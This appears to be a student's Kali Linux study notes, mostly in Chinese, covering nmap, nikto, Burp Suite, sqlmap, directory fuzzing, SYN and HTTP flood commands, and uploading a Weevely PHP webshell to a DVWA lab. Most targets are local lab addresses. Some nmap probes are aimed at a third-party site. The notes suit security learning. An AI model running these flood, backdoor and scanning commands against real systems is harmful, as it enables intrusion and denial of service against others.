# Kali-one This is a Information-security Learning of Tien-Wei Hsu
https://explainshell.com/
https://www.mediacollege.com/linux/command/linux-command.html

# ping with windows
ping 8.8.8.8 -c 4  

# ping forom windows to kali-linux
wsl ping 8.8.8.8 -c 4

🔹 1. nmap

用途：網路掃描器。

功能：偵測一台電腦或伺服器有哪些「開放的 Port」、執行什麼服務（HTTP、FTP、SSH…）、可能的作業系統。

舉例：

nmap -sV -p 4173 192.168.0.132

直接加 -Pn，告訴 Nmap「不要先 ping，直接掃 port」：
nmap -sV -p 8000 -Pn 192.168.0.132

-sV = 掃描並嘗試判斷服務版本

-p 4173 = 只掃 port 4173（你的網站）
👉 可以幫你確認「4173 port 是不是 Vite / Node.js 在跑」。


nmap --script http-enum -p 8000 -Pn 192.168.0.132
→ 嘗試列舉 Web 服務的路徑。

bash
複製程式碼
nmap --script http-title -p 8000 -Pn 192.168.0.132
→ 看看首頁標題（通常可判斷是不是 Django/FastAPI app）。

🔹 2. nikto

用途：Web 弱點掃描器。

功能：針對網站進行自動化檢查，測試是否有：

預設或錯誤的伺服器設定（比如敏感檔案 /robots.txt、.git/ 洩漏）

舊版本伺服器軟體漏洞

常見的弱點（XSS、目錄遍歷、錯誤訊息洩漏）

舉例：

nikto -h http://192.168.0.132:4173


👉 它會跑一連串測試，給你一份「安全檢查報告」。

➡️ 定位：自動掃描階段 → 快速找到常見問題。

🔹 3. Burp Suite

用途：Web 安全測試工具（算是「駭客的瑞士刀」）。

功能：

當「瀏覽器代理 (Proxy)」→ 可以攔截、修改、重送你的 HTTP 請求。

模擬攻擊 → 試探 SQL Injection、XSS、弱認證等。

暴力測試 → 自動嘗試一堆 payload（像字典攻擊）。

舉例：

開啟 Burp Suite

設定瀏覽器代理到 127.0.0.1:8080 如果需要的話請用firefox-esr 將proxy到該位置 請注意 如果想使用wsl docker 進行映射, 要注意 kali-linux 內部要用主機ip 而非127.0.0.1

利用proxy 的intercept去進行攔截請求並修改值來對後台發送攻擊

瀏覽 http://192.168.0.132:4173

你發出的每個 request 都會被攔截，你可以改動參數（例如登入密碼）再送出。

➡️ 定位：手動 / 半自動攻擊階段 → 深入分析、嘗試繞過安全檢查。

🔹 如何在 Kali 測試

用 curl 發送測試請求

curl -X POST http://192.168.0.132:8000/api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin"}'


用 Burp Suite / OWASP ZAP

攔截請求

修改 payload

觀察伺服器回應

自動化測試工具

sqlmap：專門測試 SQL Injection

sqlmap -u "http://192.168.0.132:8000/api/login" --data="username=admin&password=123"

-------------------
版本探測 (安全一點的方式)

nmap -sV -p 80,443 www.desmos.com


→ 可以顯示 Web 伺服器的版本（例如 Nginx/Apache/CloudFront）。

SSL/TLS 設定探測

nmap --script ssl-enum-ciphers -p 443 www.desmos.com


→ 可以列出 HTTPS 的加密協議，檢查安全性（例如是否支援 TLS 1.0/1.1）。

如果只是練習，可以對自己控制的伺服器跑更多深入掃描，例如 -A（OS 探測 + 版本 + traceroute + script）。

-------------------

🔹 偵測路徑

dirb 較常使用
dirb http://192.168.0.132:8000


ffuf -u http://192.168.0.132:8000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

ASP.NET 系統常有 .aspx, .asp, .bak, .config：
ffuf -u http://ip:port/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .aspx,.asp,.bak,.config -fc 404

-------------------

🔹 DDOS Test

GoldenEye（HTTP Flood）
python3 goldeneye.py http://192.168.0.132:8000/

hping3（SYN Flood） 洪水型攻擊 但似乎有點沒用
sudo hping3 -S --flood -V -p 8000 192.168.0.132

-------------------

DVWA Agent -> account:admin password:password \n

🔹 文件上傳攻擊 Upload attack

在 Kali Linux 裡，Weevely 是一個常見的 webshell 工具，用來建立後門、遠端控制網站伺服器。

weevely generate <password> <output_file>

在目標文件上傳 shell.php

啟動: weevely http://localhost:8080/hackable/uploads/shell.php 123456

!!!!!! 最新Kali 必須註釋 telnetlib
the latest weevely need to fix the import telnetlib, just comment it.

sudo nano /usr/share/weevely/modules/backdoor/tcp.py

control the webshell

weevely http://localhost:8080/hackable/uploads/shell.php 123456



